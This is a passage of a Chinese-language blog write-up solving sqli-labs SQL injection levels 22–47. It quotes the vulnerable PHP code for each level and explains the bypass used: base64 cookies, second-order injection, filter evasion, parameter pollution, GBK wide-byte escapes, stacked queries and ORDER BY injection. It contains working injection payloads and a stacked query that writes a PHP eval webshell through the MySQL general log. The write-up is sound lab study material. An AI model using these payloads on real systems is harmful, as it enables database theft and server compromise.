title="less22之cookie+base64+双引号"></a>less22之cookie+base64+双引号</h3><blockquote><p>和less20的区别在于<br><code>setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);</code><br><code>$cookee = base64_decode($cookee);</code><br><code>$cookee1 = &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</code><br>即采取了base64加密和双引号</p></blockquote></li><li><p>less20的payload单引号改成双引号然后base64加密即可<br>  eg:<code>&quot;union select 1,2,user()#</code>–base64—&gt;<code>InVuaW9uIHNlbGVjdCAxLDIsdXNlcigpIw==</code></p></li></ul><h1 id="Advanced-Injection"><a href="#Advanced-Injection" class="headerlink" title="Advanced Injection"></a>Advanced Injection</h1><blockquote><p>Advanced SQL Injection is a presentation geared toward showing security professionals advanced exploitation techniques for situations when you must prove to the customer the extent of compromise that is possible. This updated presentation will cover the following key concepts: IDS Evasion &amp; Web Application Firewall Bypass, Privilege Escalation, Re-Enabling stored procedures, Obtaining an interactive command-shell, Data Exfiltration via DNS.<br>高级SQL注入是一种演示，旨在向安全专业人员展示高级开发技术，以便在必须向客户证明可能的妥协程度时。此更新的演示文稿将涵盖以下主要概念：IDS规避和Web应用程序防火墙绕过，权限提升，重新启用存储过程，获取交互式命令shell，通过DNS进行数据泄漏。</p></blockquote><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="less24之二次注入"><a href="#less24之二次注入" class="headerlink" title="less24之二次注入"></a>less24之二次注入</h3><blockquote><p>分好几个页面，代码量有点大，可见我下图的分析，当然为了更加熟悉了解过程，推荐你自己分析一次<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90less24%E5%90%8E%E7%BB%AD.png" alt="a"><br>分析过程中弄清楚了几个理念</p><ol><li> include和header()，include是把代码包含进来，页面还是当前页面。而header是重定向，此时就可以进行burp的拦截以及参数修改</li><li> $_session[xxx]和post get参数不同！这个是存在目标服务器上的，通过用户的pgpsession来区别用户，里面的xxx参数是不可能通过burp拦截并复制的</li><li> 对转义符号更深的了解：select * from users where id=’1/‘’；这个语句没有语法错误，因为/‘实体化了，不会与前面的’闭合。但是查询的时候还是以1’这个作为id的整体进行查询！<br>此处的漏洞就如图和上面的第三点的理念有关系。uersname创建的时候以admin’#为一个整体存入，然后查询的时候，没有对这种脏数据进行再次转义导致的二次注入</li></ol></blockquote><h2 id="简单的参数过滤"><a href="#简单的参数过滤" class="headerlink" title="简单的参数过滤"></a>简单的参数过滤</h2><p>注释符号，andor，转义符号，union select的过滤</p><h3 id="less23之过滤注释符号（–-）"><a href="#less23之过滤注释符号（–-）" class="headerlink" title="less23之过滤注释符号（– #）"></a>less23之过滤注释符号（– #）</h3><blockquote><p><code>$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;</code>//分别给reg reg1 replace赋值<br><code>$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code>//分别用reg reg1去匹配过滤<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code></p></blockquote><p>前面的引号做前面的闭合，后面的引号此时不能注释掉，就也构造闭合即可</p><ul><li>  联合注入：<code>?id=&#39; union select 1,user(),&#39;3</code> （前面必须为假，因为有个limit 0,1）</li><li>  基于报错：<code>?id=1&#39;and updatexml(1,concat(0x7e,user(),0x7e),1) and &#39;1</code></li><li>  基于boolen：<code>?id=1&#39;and 1 and&#39;1</code></li><li>  基于时间：<code>?id=1&#39;and if(1,sleep(5),1)and &#39;1</code><blockquote><p>/*单独写，不闭合的sql语句必定报错，不要问为什么，就是必须闭合！此路不通！闭合就两种–+和#，/<em>仅在一种情况下可用与和，但是也是和</em>/闭合的情况下</p></blockquote><h3 id="less25之过滤逻辑运算（and-or）"><a href="#less25之过滤逻辑运算（and-or）" class="headerlink" title="less25之过滤逻辑运算（and or）"></a>less25之过滤逻辑运算（and or）</h3><blockquote><p><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);</code><br><code>$id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code>//可以基于报错</p></blockquote></li></ul><p>通用绕过思路：</p><ol><li> <del>大小写变形 Or,OR,oR</del>此处不存在大小写变形，因为<code>i</code>作为模式修正符，使得正则表达式不区分大小写，但是其他地方也许可以</li><li><del>编码,hex,urlencode</del>and or 本来就是url关键字 编码不了！ hex转码的话，服务器端并不会解码，所以and无法还原，也就失效</li><li><del>采用注释/ * or */的方法</del>此处内敛注释 /* or*/也不行，因为正则匹配正好匹配。但是也许其他地方可以</li><li>利用符号 and====&gt;&amp;&amp; or===&gt;||然后搭配之前的明注入，联合，error，盲注都可以</li><li>异或运算 1^1=0 1^0=1  1^1^1=1  1^0^1=0</li><li>双写绕过 anandd 因为他的preg_replace并没有循环进行去除</li></ol><h3 id="less25a之过滤逻辑运算-盲注"><a href="#less25a之过滤逻辑运算-盲注" class="headerlink" title="less25a之过滤逻辑运算_盲注"></a>less25a之过滤逻辑运算_盲注</h3><blockquote><p>和less25区别在于注释掉了<code>print_r(mysql_error());</code></p></blockquote><ul><li>  无非把less25的注入payload 只能盲注而已</li></ul><h3 id="less26之过滤逻辑运算-过滤注释符-过滤转义符"><a href="#less26之过滤逻辑运算-过滤注释符-过滤转义符" class="headerlink" title="less26之过滤逻辑运算+过滤注释符+过滤转义符"></a>less26之过滤逻辑运算+过滤注释符+过滤转义符</h3><blockquote><p><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);</code>//去掉or<br><code>$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);</code>//去掉and<br><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>//去掉/<em>，过滤掉了/</em> 自然就没有办法使用/*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>    //去掉–<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>    //去掉#<br><code>$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);</code>    //去掉空格<br><code>$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);</code> //去掉转义符号\和/</p><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code>//可以基于报错</p></blockquote><ul><li>  没有循环执行匹配去除，因此可以双写绕过</li><li>  基于空白符/s的过滤，后面经过fuzzer测试，ubuntu下只有%a0能够绕过基于/s的正则过滤</li><li>  综上两种方法绕过，可以搭配之前的明注、联合、error、盲注</li></ul><p><strong>补充</strong></p><ol><li> <code>[\/\\\\]</code>是什么语法？<br>PHP代码在运行的时候，所有使用转移符号的的PHP常变量都会被解析一次，字符串如果是一个正则表达式，交给正则引擎又会被解析一次。<br>代码 <code>preg_replace(&quot;/[\/\\\\]/&quot;,&#39;&#39;,$id) </code>中的表达式 <code>&quot;/[\/\\]/&quot; </code>经过PHP编译引擎后，得到的是 <code>&quot;/[\/\\]/&quot; </code>，因为] 符号在PHP引擎中是不需要转义的，所以 \ 符号原样输出。当 <code>&quot;/[\/\\]/&quot;</code> 进入正则引擎的时候，解析得到 <code>/[/\]/</code>即匹配\或者/<br><a href="https://zhidao.baidu.com/question/457282811.html">传送门</a></li><li> 追问：那为什么那一开始的/\中用/转义的\，在最开始的php引擎中没有被转义？而//却被转义？<br>在字符串里，你用哪个引号作为最外围的包围符号，那么\只能转义这个引号和\ <a href="https://zhidao.baidu.com/question/1924020732731650587.html">传送门</a></li></ol><p>综上，这个是匹配任意的\或者/ 然后去掉<br><strong>补充</strong><br>有趣的故事<br>我分别尝试了<code>1\\\\\</code>和<code>1//////</code>最后得到的结果都是1</p><ol><li>  1///////，可以观察watch窗口的id的变化值，在执行到<code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>语句的时候，他就被置为1了<br>这里我可以理解为虽然转义为了/*，但是底层可以分为两套方案识别他 既可以匹配/<em>，也可以按照</em>来匹配任意个字符一样匹配/，从而导致了这里的变化<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/a.gif"/></li><li>  <code>1\\\\\\\</code>，继续看id的值，发现在执行<code>$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);</code>会变为 1，因为我这里任意个\都会被剔除，这个暂时没想到好的办法解释…魔性！<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/b.gif"/></li></ol><p>反正就是重复上面的，任意个\或者/都会被剔除，即使是<code>id=1\\iia\\\//\\</code>这个杂序也会变成1iia</p><h3 id="less26a之过滤逻辑运算-过滤注释符-过滤转义符-盲注"><a href="#less26a之过滤逻辑运算-过滤注释符-过滤转义符-盲注" class="headerlink" title="less26a之过滤逻辑运算+过滤注释符+过滤转义符_盲注"></a>less26a之过滤逻辑运算+过滤注释符+过滤转义符_盲注</h3><blockquote><p>和less26区别在于注释掉了<code>print_r(mysql_error());</code></p></blockquote><ul><li><p>  无非把less26的注入payload 只能盲注而已</p><h3 id="less27之过滤select-union-注释符"><a href="#less27之过滤select-union-注释符" class="headerlink" title="less27之过滤select+union+注释符"></a>less27之过滤select+union+注释符</h3><blockquote><p><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>        //过滤/*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>        //过滤 –.<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>        //过滤 #.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);</code>        //过滤 union<br><code>$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);</code>        //过滤 select<br><code>$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);</code>        //过滤 UNION<br><code>$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);</code>        //过滤 SELECT<br><code>$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);</code>        //过滤 Union<br><code>$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);</code>        //过滤 select<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote></li><li><p>  因为这里不是用\s来匹配空白字符，就自己再次fuzzer了一波：%09，%0a,%0b,%0c,%0d.%a0都可以成功绕过<code>preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id)</code>这个正则</p></li><li><p>本质上这里的模式修正符号没有什么卵用，因此存在seLect这种异形能注入<br>  m：多行匹配，但是这里没有^ $来指定开头和结尾<br>  s：使得.能够匹配换行符，但是这里没有.的匹配<br>  除非i 进行无视大小写这种修正符</p></li><li><p>  根据他的过滤次数，可以考虑selecselecselecttt，三重写select 过滤掉两重剩下一重依然注入，union双写即可，其他类似</p></li><li><p>  and和or也没有被过滤啊 更简单啦！</p></li></ul><p><strong>错误的想法</strong></p><ul><li><p>  以为可以<code>select * from users where id=&#39;1&#39;union(select 1,2,&#39;3&#39;);</code>这种加个括号解决的方法，但是忽略了要在闭合3的引号之后再加上括号，但是这里<code>select * from users where id=&#39;1&#39;union(select 1,2,&#39;3）&#39;;</code>成为了这种 必然报错啦</p></li><li><p>  <code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>经过对这个的fuzzer测试，发现只有字符串里面有空格或者+号，重复出现或者交替出现，或者在字符串多处出现都会被去掉，和less26差不多的魔性，比如<code>?id=1+ asd  +a+   as1+1</code>===&gt;<code>1asdaas11</code></p><h3 id="less27a之过滤select-union-注释-盲注"><a href="#less27a之过滤select-union-注释-盲注" class="headerlink" title="less27a之过滤select+union+注释_盲注"></a>less27a之过滤select+union+注释_盲注</h3><blockquote><p>和less27区别在于注释掉了<code>print_r(mysql_error());</code></p></blockquote></li><li><p>  无非把less27的注入payload 只能盲注而已</p></li></ul><h3 id="less28之过滤select-union-注释符（二）"><a href="#less28之过滤select-union-注释符（二）" class="headerlink" title="less28之过滤select+union+注释符（二）"></a>less28之过滤select+union+注释符（二）</h3><blockquote><p><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>//过滤 /*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>//过滤 –.<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>//过滤 #.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>//过滤空格<br><code>$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code>//最核心的过滤语句<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code>//采用（’‘）的形式</p></blockquote><ul><li>由于union和select之间有个/s，但是%a0刚刚好不在这个范畴之类，于是构造<code>?id=1&#39;)union%a0select%a01,2,(&#39;4</code>利用成功。<ul><li>  <del>%0b也测试成功</del>%0b不放在union select之间，放在其他位置可以测试成功，但是放在这之间不行。因为/s能绕过的只有%a0**，其他地方空格的匹配模式是<code>/[ +]/</code>！！！！！</li></ul></li></ul><h3 id="less28a之过滤select-union-注释符-盲注（二）"><a href="#less28a之过滤select-union-注释符-盲注（二）" class="headerlink" title="less28a之过滤select+union+注释符_盲注（二）"></a>less28a之过滤select+union+注释符_盲注（二）</h3><blockquote><p>只保留了一个黑名单<code>id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code><br>同时注释掉了报错而已</p></blockquote><ul><li>  无非把less28的注入payload 只能盲注而已</li></ul><h2 id="HPP（http-parameter-pollution）"><a href="#HPP（http-parameter-pollution）" class="headerlink" title="HPP（http parameter pollution）"></a>HPP（http parameter pollution）</h2><h3 id="less29之初探HPP"><a href="#less29之初探HPP" class="headerlink" title="less29之初探HPP"></a>less29之初探HPP</h3><p>最好的waf?我不看源码分析，直接上手撸！</p><ul><li>  <code>?id=1&#39;and if(1,1,sleep(5)) and &#39;1</code></li><li>  <code>?id=1&#39;and updatexml(1,concat(0x7e,user(),0x7e),1)and &#39;1</code></li><li>  <code>?id=1&#39;and length(database())=8 and &#39;1</code></li><li>  <code>?id=2&#39;and 1--+</code></li><li>  <code>?id=1&#39; union select 1,1,2--+</code></li></ul><p>我曹，怎么都能过？说好的世界最好的waf?</p><p>不行，得看看源码再看下index.php的代码？excuse？什么鬼啊！！！说好的waf?</p><blockquote><p>百度了一波！要装tomcat，来模拟waf。（我们往往在tomcat服务器处做数据过滤和处理，使其功能类似为一个 WAF，然后再将waf过滤后的参数传递给Apache服务器。就类似与我们客户端与Apache服务器进行数据交换的过程中，经过了tomcat这一层代理，而这一层代理会对我们提交的参数进行过滤）<br>利用原理是HPP（http parameter pollution）：填写两个id，分别赋予不同的值，前者赋予正常的值，后者则是我们sql注入语句。tomcat默认获得前一个id的值然后进行过滤，而Apache默认get后面的id的值。<br>但是我们没有tomcat，怎么办呢？<br>sql-labs作者很高明，为了满足没有装tomcat的我们，做了一个login.php，可以模拟这个过程。同时可以观察它模拟的这个过程中使用的函数，进一步让我们理解tomcat和Apache交互过程，进而了解HPP。<br>下面是我分析的函数执行过程，和二次注入一样，自己分析有助于加强对漏洞的理解<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607104002.png" alt="20190607104002.png"></p></blockquote><p>所以接下来的绕过就很简单，前面id是正常的，后面id赋值的话就把前面的姿势都用一次即可！</p><ul><li>  <code>Less-29/login.php?id=1&amp;id=&#39;union select 1,user(),&#39;2</code></li></ul><h3 id="less30之再探"><a href="#less30之再探" class="headerlink" title="less30之再探"></a>less30之再探</h3><blockquote><p><code>$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;</code>多了这一层</p></blockquote><p>easy</p><h3 id="less31之三探"><a href="#less31之三探" class="headerlink" title="less31之三探"></a>less31之三探</h3><blockquote><p><code>$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p></blockquote><p>easy</p><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><blockquote><p>仅针对：GBK编码的数据库+addslashes处理过的数据 绕过</p></blockquote><h3 id="less32之自定义addslashes（）函数"><a href="#less32之自定义addslashes（）函数" class="headerlink" title="less32之自定义addslashes（）函数"></a>less32之自定义addslashes（）函数</h3><blockquote><p><code>function check_addslashes($string)</code><br><code>       $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);</code><br><code>       $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);</code><br><code>      $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);</code><br><code>return $string;</code><br>使用上述函数来模拟addslashes函数的过程</p><blockquote><p>preg_quote函数的作用使他里面的东西保持原来的样子，比如这里因为有特殊字符\，所以无法正常匹配到\ \，只能匹配到,而使用了这个函数就相当于/\ \ \ /，帮你转义了，使你可以正常匹配到你想要的字符串，即使它里面含有特殊字符<a href="https://www.cnblogs.com/zhanai/p/6868219.html">传送门</a><br>但是在这里很神奇，这个函数处理过程在我debug之后发现，无论你输入多少个\，他都能转义，比如输入5个\，转义出来的结果为10个\，3个则对应6个\</p></blockquote></blockquote><ul><li><p>他没过滤掉注释符，所以可以随便注入，前提只要用%df逃逸掉‘从而闭合掉前面的’即可<br>   <code>?id=-1%df%27union%20select%201,user(),3--+</code></p><h3 id="less33之调用addslashes-函数处理——GET"><a href="#less33之调用addslashes-函数处理——GET" class="headerlink" title="less33之调用addslashes()函数处理——GET"></a>less33之调用addslashes()函数处理——GET</h3><p><code> $id=check_addslashes($_GET[&#39;id&#39;]);</code> //对应的check_addslashes就是调用addslashes函数而已</p></li><li><p>  同上<code>?id=-1%df%27union%20select%201,user(),3--+</code></p><h3 id="less34之调用addslashes-函数处理——POST"><a href="#less34之调用addslashes-函数处理——POST" class="headerlink" title="less34之调用addslashes()函数处理——POST"></a>less34之调用addslashes()函数处理——POST</h3><blockquote><p><code>    $uname1=$_POST[&#39;uname&#39;];</code><br><code>$passwd1=$_POST[&#39;passwd&#39;];</code><br><code> $uname = addslashes($uname1);</code><br><code>$passwd= addslashes($passwd1);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></p></blockquote></li></ul><p>%df的字符又无法表示，怎么办呢？直接burp改即可</p><ul><li>  <code>uname=%df%27or+1%23&amp;passwd=a&amp;submit=Submit</code></li></ul><p><strong>补充</strong><br>此处以post提交表单，此时就没有编码了，那我如何构造%df这种特殊字符？<br>我直接在页面的输入框框里面填？直接填<code>%df&#39; or 1 #</code>会怎么样？</p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607181111.png" alt="20190607181111.png"></p></blockquote><p>从上图可知，很明显不行,无法注入<br>具体为啥在输入框填写的参数到html包里进行一次编码了的原因暂时未知（%25===&gt;%）<br><strong>补充</strong><br>《mysql注入天书》less34里面提到“utf-8 转换为 utf-16 或 utf-32,例如将 ‘ 转为 utf-16 为<code> � &#39;</code>，以及对应的万能密码<code>� &#39; or 1=1#</code>，目前在我的环境下无法复现，因为我赋值粘贴的时候可能因为编码的原因，用burp拦截包的post的body的uname对于的值为<code>%EF%BF%BD+%27+or+1%3D1%23</code>，很明显不行<br>我也尝试过用Python：<code>print &quot;&#39;&quot;.encode(&quot;utf16&quot;)</code>也是上面的问题<br>网上也没有找到utf8 utf16互相转换的工具<br>因此还是直接burp改包算了，毕竟找到字符表示也存在上述复制粘贴的编码问题</p><h3 id="less35之调用addslashes-函数处理-int形注入"><a href="#less35之调用addslashes-函数处理-int形注入" class="headerlink" title="less35之调用addslashes()函数处理+int形注入"></a>less35之调用addslashes()函数处理+int形注入</h3><p><code>$id=addslashes($_GET[&#39;id&#39;]);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p><p>此时就是int形注入了，都不需要引号了，此时的addslashes函数形同虚设</p><ul><li>  ？id=1 and 1<h3 id="less36之mysql-real-escape-string——GET"><a href="#less36之mysql-real-escape-string——GET" class="headerlink" title="less36之mysql_real_escape_string——GET"></a>less36之mysql_real_escape_string——GET</h3><code>$id= mysql_real_escape_string($id); </code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></li></ul><p>mysql_real_escape_string()前指定mysql连接字符集，如果是GBK的，必须使用<strong>mysql_set_charset</strong>(‘GBK’)设置才安全，而这里仅仅只是<code>SET NAMES gbk</code>，所以还是存在宽字节绕过问题</p><ul><li>  <code>?id=%df%27or%201%23</code><h4 id="less37之mysql-real-escape-string——POST"><a href="#less37之mysql-real-escape-string——POST" class="headerlink" title="less37之mysql_real_escape_string——POST"></a>less37之mysql_real_escape_string——POST</h4><code> $uname = mysql_real_escape_string($uname1);</code><br><code>$passwd= mysql_real_escape_string($passwd1);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></li></ul><p>同36的问题，没有用mysql_set_charset(“GBK”)</p><blockquote><p>解题思路同less35，burp拦截 然后改下参数即可</p></blockquote><h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><strong>首先声明：这里的环境不能实现select 。只能说是堆叠以增删改信息，不能查</strong><br>下面是我的探索过程<br>1    .查看了下源代码，发现<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611165611.png" alt="20190611165611.png"><br>2.   发现了mysqli_multi_query函数<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222136.png" alt="20190610222136.png"><br>3.   因为他只能显示一个结果集,同时如果第一个 SQL 语句就失败了，返回 FALSE。 如果是批量执行 SQL 语句， 必须首先调用 mysqli_next_result() 函数，才可以获取后续语句的错误信息。<br>4.   根据<a href="https://www.php.net/manual/zh/mysqli.multi-query.php">官方文档</a>：可以发现他的源代码就是官方文档上面抄的demo，只是去掉了do-while循环，导致无法进一步查询<br>     于是我尝试用下面范例里面的do while改写<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222443.png" alt="20190610222443.png"><br>5.   修改之后在执行堆叠查询，使得他可以显示多个结果<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222421.png" alt="20190610222421.png"><br>6.   当然这个不能使用set prepare语句，毕竟你无论先set还是直接prepare，都会导致该语句执行结果为空集，从而导致mysqli_next_result返回结果为false，进而根据循环而退出<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222705.png" alt="20190610222705.png"><br><strong>综上</strong>:这里的环境有如下几个限制</p><ol><li>  只会显示第一次查询的结果，因此这里只能增删改的方法注入</li><li>  改了源代码，可以显示多次执行结果，但是也无法实现PDO语句查询</li></ol><h3 id="less38之单引号"><a href="#less38之单引号" class="headerlink" title="less38之单引号"></a>less38之单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote><ul><li>  因为是上面的语句，我使用不堆叠注入都可以成功：<code>?id=&#39; union select 1,2,3;--+</code>，进而可以把前面可以利用的一把梭，当然包括报错注入</li><li>  是否尝试load或者写入文件？当然可以，不过目前受限于secure_file_priv</li><li>   通过开始日志文件log来写入shell<code>id=1&#39;;set global general_log=on;set global general_log_file=&#39;/tmp/tony.php&#39;;select &#39;&lt;?php eval($_POST[tony]) ?&gt;&#39;;%23</code>（尝试成功）</li><li>   增加用户：<code>?id=1&#39;;insert into users(id,username,password) values (&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;)--+</code>删delete和改alter都这个差不多，这种增删改比较通用</li></ul><h3 id="less39之int型注入"><a href="#less39之int型注入" class="headerlink" title="less39之int型注入"></a>less39之int型注入</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p></blockquote><p>同上，基本没变，只是去掉了单引号而已</p><h3 id="less40之单引号-括号"><a href="#less40之单引号-括号" class="headerlink" title="less40之单引号+括号"></a>less40之单引号+括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p></blockquote><p>同上，基本没变，只是单引号+括号而已</p><h3 id="less41之int型-禁止了报错"><a href="#less41之int型-禁止了报错" class="headerlink" title="less41之int型_禁止了报错"></a>less41之int型_禁止了报错</h3><blockquote><p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>没有了这个语句<code>print_r(mysqli_error($con1));</code></p></blockquote><p>还是把前面的可以一把梭哈，只不过没有了基于报错的注入而已</p><h3 id="less42之单引号——post"><a href="#less42之单引号——post" class="headerlink" title="less42之单引号——post"></a>less42之单引号——post</h3><blockquote><p><code> $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</code><br><code>$password = $_POST[&quot;login_password&quot;];</code><br><code>$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br><code>@mysqli_multi_query($con1, $sql)</code></p></blockquote><p>用了mysqli_real_escape过滤username</p><ul><li>  宽字节注入逃逸单引号</li><li>  上面堆叠注入的姿势，基本都可以在password这里再次尝试，因为password没被过滤</li></ul><h3 id="less43之单引号-括号——post"><a href="#less43之单引号-括号——post" class="headerlink" title="less43之单引号+括号——post"></a>less43之单引号+括号——post</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;</code></p></blockquote><p>单引号+括号，没意思</p><h3 id="less44之单引号-禁止了报错——post"><a href="#less44之单引号-禁止了报错——post" class="headerlink" title="less44之单引号+禁止了报错——post"></a>less44之单引号+禁止了报错——post</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br>没有了这个语句<code>print_r(mysqli_error($con1));</code></p></blockquote><p>同上 没意思</p><h3 id="less45之单引号-括号-禁止报错——post"><a href="#less45之单引号-括号-禁止报错——post" class="headerlink" title="less45之单引号+括号+禁止报错——post"></a>less45之单引号+括号+禁止报错——post</h3><p>同43，不过没有了报错信息，没意思</p><h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><h3 id="less46之int型"><a href="#less46之int型" class="headerlink" title="less46之int型"></a>less46之int型</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p></blockquote><ul><li>  基于bool：<code>sort=rand(ascii(left(database(),1))=115)</code></li><li>  基于报错：<code>sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)</code></li><li>  基于时间：<code>If(ascii(substr(database(),1,1))=115,0,sleep (5))</code><h3 id="less47之单引号"><a href="#less47之单引号" class="headerlink" title="less47之单引号"></a>less47之单引号</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code></p></blockquote></li></ul><p>因为order by后面只能跟int型，加了引号之后，引号里面无论是什么都无济于事，都不会改变显示结果<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611234830.png" alt="20190611234830.png"><br>但是天无绝人之路</p><ul><li>  基于报错，和上面一样<code>sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)</code></li><li>  基于时间延迟</li></ul><p>二者都能执行的核心在于id里面的sql语句会被执行<br><strong>瞬间打脸</strong><br>我想的这两个想法都是错的，因为Id两边的单引号存在，id里面的sql语句并不会执行<br>也就说基于报错，基于时间延迟，也得闭合’ 然后搭配and使用<br><strong>看了下答案</strong><br>后面可以形成闭合啊，如果id没有被waf处理，可以在id这里构造引号与前面的引号形成闭合<br>比如<code>?sort=1%27and%20rand(ascii(left(database(),1))=116)--+</code>，进入数据库执行就是<code>SELECT * FROM users ORDER BY &#39;1&#39;and rand(ascii(left(database(),1))=116)-- &#39;</code>，与id后面的引号闭合之后 and 的后面的语句就不会受到引号限制，故而可以执行<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611235403.png" alt="20190611235403.png"><br>同时这个截图也想告诉大家：受限于语法结构问题，order 